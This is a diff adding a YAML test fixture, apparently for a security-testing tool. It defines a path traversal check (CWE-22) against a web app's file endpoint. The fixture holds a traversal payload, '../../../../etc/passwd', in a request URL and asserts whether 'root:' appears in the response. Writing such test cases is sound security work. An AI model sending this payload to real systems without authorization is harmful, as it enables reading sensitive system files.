@@ -1,0 +1,30 @@
+# tests/fixtures/cases/seed/path-traversal-read.yaml
+id: seed-path-traversal-read
+version: "0.1.0"
+author: "p1a-knowledge-port"
+risk: active
+target_type: web_app
+schema: secopent.case/v1
+origin: manual
+cwe: ["CWE-22", "CWE-98"]
+owasp: ["A01:2021"]
+preconditions:
+  - "target endpoint accepts file path or filename parameter"
+steps:
+  - id: request-with-traversal
+    action: http.request
+    spec:
+      method: GET
+      url: "{{base_url}}/api/files?name=../../../../etc/passwd"
+  - id: request-baseline
+    action: http.request
+    spec:
+      method: GET
+      url: "{{base_url}}/api/files?name=readme.txt"
+assertions:
+  - id: traversal-echoes-sensitive-content
+    expression: "'root:' in steps['request-with-traversal'].body or steps['request-with-traversal'].status in (400, 403)"
+evidence_req: ["response-body", "status-code"]
+verification:
+  method: path-traversal
+  reproduce: 2
